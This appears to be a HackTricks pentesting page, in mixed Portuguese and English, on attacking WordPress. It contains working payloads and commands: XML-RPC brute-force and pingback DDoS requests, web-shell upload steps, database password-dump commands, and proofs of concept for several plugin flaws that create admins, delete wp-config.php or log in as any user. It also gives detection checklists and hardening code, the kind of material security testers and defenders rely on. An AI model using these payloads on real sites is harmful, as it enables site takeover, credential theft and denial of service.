# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

- **Arquivos enviados** v√£o para: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Os arquivos de temas podem ser encontrados em /wp-content/themes/,** ent√£o se voc√™ alterar algum php do tema para obter RCE provavelmente usar√° esse caminho. Por exemplo: Usando **theme twentytwelve** voc√™ pode **access** o arquivo **404.php** em: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Outra URL √∫til pode ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- No **wp-config.php** voc√™ pode encontrar a senha root do banco de dados.
- Caminhos de login padr√£o para verificar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Principais arquivos do WordPress**

- `index.php`
- `license.txt` cont√©m informa√ß√µes √∫teis, como a vers√£o do WordPress instalada.
- `wp-activate.php` √© usado para o processo de ativa√ß√£o por e-mail ao configurar um novo site WordPress.
- Pastas de login (podem ser renomeadas para ocult√°-las):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` √© um arquivo que representa um recurso do WordPress que permite que dados sejam transmitidos usando HTTP como mecanismo de transporte e XML como mecanismo de codifica√ß√£o. Esse tipo de comunica√ß√£o foi substitu√≠do pela WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- A pasta `wp-content` √© o diret√≥rio principal onde plugins e temas s√£o armazenados.
- `wp-content/uploads/` √© o diret√≥rio onde quaisquer arquivos enviados para a plataforma s√£o armazenados.
- `wp-includes/` √© o diret√≥rio onde os arquivos core s√£o armazenados, como certificados, fontes, arquivos JavaScript e widgets.
- `wp-sitemap.xml` Em vers√µes do WordPress 5.5 e superiores, o WordPress gera um arquivo sitemap XML com todas as postagens p√∫blicas e tipos de post e taxonomias publicamente consult√°veis.

**Post exploitation**

- O arquivo `wp-config.php` cont√©m informa√ß√µes necess√°rias ao WordPress para conectar-se ao banco de dados, como o nome do banco de dados, host do banco de dados, nome de usu√°rio e senha, chaves de autentica√ß√£o e salts, e o prefixo das tabelas do banco de dados. Esse arquivo de configura√ß√£o tamb√©m pode ser usado para ativar o modo DEBUG, o que pode ser √∫til na resolu√ß√£o de problemas.

### Permiss√µes de Usu√°rios

- **Administrador**
- **Editor**: Publica e gerencia suas pr√≥prias postagens e as de outros
- **Autor**: Publica e gerencia suas pr√≥prias postagens
- **Contribuidor**: Escreve e gerencia suas postagens, mas n√£o pode public√°-las
- **Assinante**: Navega pelas postagens e edita seu perfil

## **Passive Enumeration**

### **Obter vers√£o do WordPress**

Verifique se voc√™ consegue encontrar os arquivos `/license.txt` ou `/readme.html`

Dentro do **c√≥digo-fonte** da p√°gina (exemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Arquivos de link CSS

![](<../../images/image (533).png>)

- Arquivos JavaScript

![](<../../images/image (524).png>)

### Obter Plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obter Temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extrair vers√µes em geral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumera√ß√£o ativa

### Plugins e Temas

Provavelmente voc√™ n√£o conseguir√° encontrar todos os Plugins e Temas poss√≠veis. Para descobrir todos eles, voc√™ precisar√° **ativamente Brute Force uma lista de Plugins e Temas** (esperan√ßosamente para n√≥s existem ferramentas automatizadas que cont√™m essas listas).

### Usu√°rios

- **ID Brute:** Voc√™ obt√©m usu√°rios v√°lidos de um site WordPress ao Brute Forcing os IDs de usu√°rios:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Se as respostas forem **200** ou **30X**, isso significa que o id √© **v√°lido**. Se a resposta for **400**, ent√£o o id √© **inv√°lido**.

- **wp-json:** Voc√™ tamb√©m pode tentar obter informa√ß√µes sobre os usu√°rios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Outro endpoint `/wp-json/` que pode revelar algumas informa√ß√µes sobre usu√°rios √©:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Observe que este endpoint exp√µe apenas usu√°rios que fizeram um post. **Somente informa√ß√µes sobre os usu√°rios que t√™m este recurso habilitado ser√£o fornecidas**.

Tamb√©m observe que **/wp-json/wp/v2/pages** could leak endere√ßos IP.

- **Login username enumeration**: Ao fazer login em **`/wp-login.php`**, a **mensagem** √© **diferente** dependendo se o **username existe ou n√£o**.

### XML-RPC

Se `xml-rpc.php` estiver ativo, voc√™ pode realizar um credentials brute-force ou us√°-lo para lan√ßar ataques DoS a outros recursos. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Para verificar se est√° ativo, tente acessar _**/xmlrpc.php**_ e envie esta requisi√ß√£o:

**Verificar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** s√£o alguns dos m√©todos que podem ser usados para brute-force credentials. Se voc√™ conseguir encontrar algum deles, pode enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
A mensagem _"Incorrect username or password"_ dentro de uma resposta com c√≥digo 200 deve aparecer se as credentials n√£o estiverem v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Usando as credentials corretas voc√™ pode fazer upload de um arquivo. Na resposta, o caminho aparecer√° ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo foi feito para programas e n√£o para humanos, e √© antigo, portanto n√£o suporta 2FA. Ent√£o, se voc√™ tiver creds v√°lidas mas a entrada principal estiver protegida por 2FA, **voc√™ pode ser capaz de abusar de xmlrpc.php para fazer login com essas creds contornando a 2FA**. Note que voc√™ n√£o conseguir√° executar todas as a√ß√µes que pode fazer pelo console, mas ainda assim pode chegar a RCE como o Ippsec explica em [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **milhares** de Wordpress **sites** to **acessar** um √∫nico **local** (causando um **DDoS** nesse local) ou voc√™ pode us√°-lo para fazer o **Wordpress** **scan** alguma **rede** interna (voc√™ pode indicar qualquer porta).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Se voc√™ obtiver **faultCode** com um valor **maior do que** **0** (17), isso significa que a porta est√° aberta.

Veja o uso de **`system.multicall`** na se√ß√£o anterior para aprender como abusar deste m√©todo para causar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Este arquivo geralmente existe na raiz do site WordPress: **`/wp-cron.php`**\
Quando este arquivo √© **acessado**, uma consulta MySQL **"pesada"** √© executada, ent√£o ele pode ser usado por **atacantes** para **causar** um **DoS**.\
Al√©m disso, por padr√£o, o `wp-cron.php` √© chamado em cada carregamento de p√°gina (sempre que um cliente solicita qualquer p√°gina do WordPress), o que em sites de alto tr√°fego pode causar problemas (DoS).

Recomenda-se desabilitar o Wp-Cron e criar um cronjob real no host que execute as a√ß√µes necess√°rias em intervalos regulares (sem causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Tente acessar _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ e o site WordPress pode fazer uma requisi√ß√£o para voc√™.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta ferramenta verifica se o **methodName: pingback.ping** e o caminho **/wp-json/oembed/1.0/proxy** existem; se existirem, tenta explor√°-los.

## Ferramentas Autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obter acesso sobrescrevendo um bit

Mais do que um ataque real, isto √© uma curiosidade. No CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) voc√™ poderia inverter 1 bit de qualquer arquivo do wordpress. Ent√£o voc√™ poderia inverter a posi√ß√£o `5389` do arquivo `/var/www/html/wp-includes/user.php` para tornar NOP a opera√ß√£o NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Painel RCE**

**Modificando um php do tema usado (credenciais admin necess√°rias)**

Apar√™ncia ‚Üí Editor de Tema ‚Üí Template 404 (√† direita)

Substitua o conte√∫do por um shell php:

![](<../../images/image (384).png>)

Procure na internet como acessar essa p√°gina atualizada. Neste caso voc√™ deve acessar aqui: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Voc√™ pode usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
para obter uma sess√£o.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Crie seu php backdoor usando por exemplo:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: O plugin √© obtido de uma fonte como Exploit DB, por exemplo [**aqui**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Fa√ßa upload do arquivo zip do plugin baixado.
3. **Plugin Activation**: Uma vez que o plugin esteja instalado com sucesso, ele deve ser ativado atrav√©s do dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

O conte√∫do inclui ilustra√ß√µes que mostram os passos no dashboard do WordPress para instalar e ativar o plugin. Entretanto, √© importante notar que explorar vulnerabilidades dessa maneira √© ilegal e anti√©tico sem a devida autoriza√ß√£o. Estas informa√ß√µes devem ser usadas de forma respons√°vel e apenas em um contexto legal, como pentesting com permiss√£o expl√≠cita.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ √© um script projetado para escalar uma vulnerabilidade **Cross-Site Scripting (XSS)** para **Remote Code Execution (RCE)** ou outras vulnerabilidades cr√≠ticas no WordPress. Para mais informa√ß√µes confira [**este post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Ele fornece **suporte para Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Cria um usu√°rio no WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Faz upload do seu custom plugin (backdoor) para o WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita um Built-In Plugin no WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita um Built-In Theme no WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits para plugins/themes de terceiros do WordPress.

## Post Exploitation

Extrair nomes de usu√°rio e senhas:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Alterar password do admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Saber como um plugin do Wordpress pode expor funcionalidades √© essencial para encontrar vulnerabilidades nessas funcionalidades. Voc√™ pode ver como um plugin pode expor funcionalidades nos itens abaixo e alguns exemplos de plugins vulner√°veis em [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Uma das formas pelas quais um plugin pode expor fun√ß√µes para os usu√°rios √© via AJAX handlers. Estes podem conter bugs de l√≥gica, authorization, ou authentication. Al√©m disso, √© bastante frequente que essas fun√ß√µes baseiem tanto a authentication quanto a authorization na exist√™ncia de um wordpress nonce que **any user authenticated in the Wordpress instance might have** (independentemente do seu role).

Estas s√£o as fun√ß√µes que podem ser usadas para expor uma fun√ß√£o em um plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**O uso de `nopriv` torna o endpoint acess√≠vel por quaisquer users (mesmo os n√£o autenticados).**

> [!CAUTION]
> Al√©m disso, se a fun√ß√£o estiver apenas verificando a autoriza√ß√£o do user com a fun√ß√£o `wp_verify_nonce`, essa fun√ß√£o est√° apenas verificando se o user est√° loggedin; ela normalmente n√£o verifica o role do user. Portanto users com baixo privil√©gio podem ter acesso a a√ß√µes de alto privil√©gio.

- **REST API**

Tamb√©m √© poss√≠vel expor fun√ß√µes do wordpress registrando uma REST API usando a fun√ß√£o `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
O `permission_callback` √© um callback para uma fun√ß√£o que verifica se um determinado usu√°rio est√° autorizado a chamar o m√©todo da API.

**Se a fun√ß√£o integrada `__return_true` for usada, ela simplesmente pular√° a verifica√ß√£o de permiss√µes do usu√°rio.**

- **Acesso direto ao arquivo php**

Claro que o Wordpress usa PHP e arquivos dentro de plugins s√£o diretamente acess√≠veis pela web. Portanto, caso um plugin exponha qualquer funcionalidade vulner√°vel que seja disparada apenas ao acessar o arquivo, ela poder√° ser explorada por qualquer usu√°rio.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Alguns plugins implementam atalhos de ‚Äútrusted header‚Äù para integra√ß√µes internas ou reverse proxies e ent√£o usam esse header para definir o contexto do usu√°rio atual para requisi√ß√µes REST. Se o header n√£o estiver ligado criptograficamente √† requisi√ß√£o por um componente upstream, um atacante pode forj√°-lo e acessar rotas REST privilegiadas como administrador.

- Impact: escalada de privil√©gio n√£o autenticada para admin ao criar um novo administrator via a rota REST core users.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por que funciona

- O plugin mapeia um header controlado pelo cliente para o estado de autentica√ß√£o e ignora as verifica√ß√µes de capability.
- O core do WordPress espera a capability `create_users` para esta rota; o hack do plugin a contorna definindo diretamente o contexto do usu√°rio atual a partir do header.

Indicadores de sucesso esperados

- HTTP 201 com um corpo JSON descrevendo o usu√°rio criado.
- Um novo usu√°rio administrador vis√≠vel em `wp-admin/users.php`.

Checklist de detec√ß√£o

- Fa√ßa grep por `getallheaders()`, `$_SERVER['HTTP_...']`, ou SDKs de terceiros que leiam headers customizados para definir o contexto do usu√°rio (por exemplo, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revise os registros REST em busca de callbacks privilegiados que n√£o tenham checagens robustas de `permission_callback` e que, em vez disso, dependam de headers da requisi√ß√£o.
- Procure por usos de fun√ß√µes core de gerenciamento de usu√°rios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que s√£o protegidos apenas por valores de headers.

Endurecimento

- Nunca derive autentica√ß√£o ou autoriza√ß√£o de headers controlados pelo cliente.
- Se um reverse proxy precisar injetar identidade, encerre a confian√ßa no proxy e remova c√≥pias inbound (por exemplo, `unset X-Wcpay-Platform-Checkout-User` na borda), ent√£o passe um token assinado e verifique-o no servidor.
- Para rotas REST que executam a√ß√µes privilegiadas, exija checagens `current_user_can()` e um `permission_callback` rigoroso (N√ÉO use `__return_true`).
- Prefira autentica√ß√£o first-party (cookies, application passwords, OAuth) em vez de ‚Äúimpersonation‚Äù por header.

Refer√™ncias: veja os links no final desta p√°gina para um caso p√∫blico e uma an√°lise mais ampla.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

O tema multipurpose Litho (< 3.1) esqueceu esses 3 controles na funcionalidade *Remover Fam√≠lia de Fontes* e acabou distribuindo o seguinte c√≥digo (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introduzidos por este trecho:

* **Unauthenticated access** ‚Äì o hook `wp_ajax_nopriv_` est√° registrado.
* **No nonce / capability check** ‚Äì qualquer visitante pode acessar o endpoint.
* **No path sanitisation** ‚Äì a string controlada pelo usu√°rio `fontfamily` √© concatenada a um caminho do sistema de arquivos sem filtragem, permitindo a cl√°ssica travessia `../../`.

#### Exploitation

Um atacante pode excluir qualquer arquivo ou diret√≥rio **abaixo do diret√≥rio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando uma √∫nica requisi√ß√£o HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Porque `wp-config.php` fica fora de *uploads*, quatro sequ√™ncias `../` s√£o suficientes em uma instala√ß√£o padr√£o. Excluir `wp-config.php` for√ßa o WordPress a entrar no *assistente de instala√ß√£o* na pr√≥xima visita, permitindo a tomada completa do site (o atacante apenas fornece uma nova configura√ß√£o de DB e cria um usu√°rio administrador).

Outros alvos impactantes incluem arquivos `.php` de plugin/theme (para desativar plugins de seguran√ßa) ou regras `.htaccess`.

#### Checklist de detec√ß√£o

* Qualquer callback `add_action( 'wp_ajax_nopriv_...')` que invoque filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatena√ß√£o de entrada de usu√°rio n√£o sanitizada em caminhos (procure por `$_POST`, `$_GET`, `$_REQUEST`).
* Aus√™ncia de `check_ajax_referer()` e `current_user_can()`/`is_user_logged_in()`.

#### Endurecimento
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Sempre** trate qualquer opera√ß√£o de escrita/exclus√£o em disco como privilegiada e verifique duas vezes:
> ‚Ä¢ Authentication  ‚Ä¢ Authorisation  ‚Ä¢ Nonce  ‚Ä¢ Input sanitisation  ‚Ä¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Muitos plugins implementam um recurso "view as role" ou altern√¢ncia tempor√°ria de role salvando o(s) role(s) originais em user meta para que possam ser restaurados mais tarde. Se o caminho de restaura√ß√£o depende apenas de request parameters (e.g., `$_REQUEST['reset-for']`) e de uma lista mantida pelo plugin sem verificar capabilities e um nonce v√°lido, isso se torna uma vertical privilege escalation.

Um exemplo real foi encontrado no plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). O ramo de reset restaurava roles com base em `reset-for=<username>` se o username aparecia em um array interno `$options['viewing_admin_as_role_are']`, mas n√£o executava nem um `current_user_can()` nem uma verifica√ß√£o de nonce antes de remover os roles atuais e re-adicionar os roles salvos do user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por que √© explor√°vel

- Confia em `$_REQUEST['reset-for']` e em uma op√ß√£o do plugin sem autoriza√ß√£o no servidor.
- Se um usu√°rio anteriormente teve privil√©gios mais altos salvos em `_asenha_view_admin_as_original_roles` e foi rebaixado, ele pode restaur√°-los acessando o caminho de reset.
- Em algumas implanta√ß√µes, qualquer usu√°rio autenticado poderia disparar um reset para outro nome de usu√°rio ainda presente em `viewing_admin_as_role_are` (autoriza√ß√£o quebrada).

Pr√©-requisitos do ataque

- Vers√£o vulner√°vel do plugin com o recurso habilitado.
- A conta alvo tem uma role de alto privil√©gio obsoleta armazenada em user meta de uso anterior.
- Qualquer sess√£o autenticada; aus√™ncia de nonce/capability no fluxo de reset.

Explora√ß√£o (exemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Em builds vulner√°veis isso remove as fun√ß√µes atuais e readiciona as fun√ß√µes originais salvas (por exemplo, `administrator`), escalando privil√©gios de forma efetiva.

Detection checklist

- Procure por recursos de troca de fun√ß√£o que persistam ‚Äúfun√ß√µes originais‚Äù em user meta (por exemplo, `_asenha_view_admin_as_original_roles`).
- Identifique paths de reset/restore que:
- Leem nomes de usu√°rio de `$_REQUEST` / `$_GET` / `$_POST`.
- Modificam fun√ß√µes via `add_role()` / `remove_role()` sem `current_user_can()` e `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizam com base em um array de op√ß√£o do plugin (por exemplo, `viewing_admin_as_role_are`) em vez das capacidades do ator.

Hardening

- Aplique verifica√ß√µes de capacidade em todos os ramos que alteram estado (por exemplo, `current_user_can('manage_options')` ou mais restrito).
- Exija nonces para todas as muta√ß√µes de fun√ß√£o/permiss√£o e verifique-os: `check_admin_referer()` / `wp_verify_nonce()`.
- Nunca confie em nomes de usu√°rio fornecidos na requisi√ß√£o; resolva o usu√°rio alvo no servidor com base no ator autenticado e em pol√≠tica expl√≠cita.
- Invalide o estado das ‚Äúfun√ß√µes originais‚Äù nas atualiza√ß√µes de perfil/fun√ß√£o para evitar restaura√ß√£o obsoleta de privil√©gios elevados:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Considere armazenar o m√≠nimo de estado e usar tokens com tempo limitado e protegidos por capability para trocas tempor√°rias de fun√ß√£o.

---

### Escalada de privil√©gio n√£o autenticada via troca de usu√°rio confi√°vel por cookie no init p√∫blico (Service Finder ‚Äúsf-booking‚Äù)

Alguns plugins ligam helpers de troca de usu√°rio ao hook p√∫blico `init` e derivam a identidade a partir de um cookie controlado pelo cliente. Se o c√≥digo chamar `wp_set_auth_cookie()` sem verificar autentica√ß√£o, capability e um nonce v√°lido, qualquer visitante n√£o autenticado pode for√ßar o login como um ID de usu√°rio arbitr√°rio.

Padr√£o vulner√°vel t√≠pico (simplificado de Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por que √© explor√°vel

- O hook p√∫blico `init` torna o handler acess√≠vel por unauthenticated users (sem a prote√ß√£o `is_user_logged_in()`).
- A identidade √© derivada de um cookie modific√°vel pelo cliente (`original_user_id`).
- Uma chamada direta para `wp_set_auth_cookie($uid)` autentica o requisitante como esse usu√°rio sem qualquer verifica√ß√£o de capability/nonce.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Considera√ß√µes de WAF para CVEs do WordPress/plugins

WAFs gen√©ricos de edge/servidor s√£o ajustados para padr√µes amplos (SQLi, XSS, LFI). Muitas falhas de alto impacto em WordPress/plugins s√£o bugs de l√≥gica/autentica√ß√£o espec√≠ficos da aplica√ß√£o que parecem tr√°fego benigno a menos que o motor entenda as rotas do WordPress e a sem√¢ntica dos plugins.

Notas ofensivas

- Direcione endpoints espec√≠ficos de plugins com payloads limpos: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, manipuladores de arquivo personalizados, shortcodes.
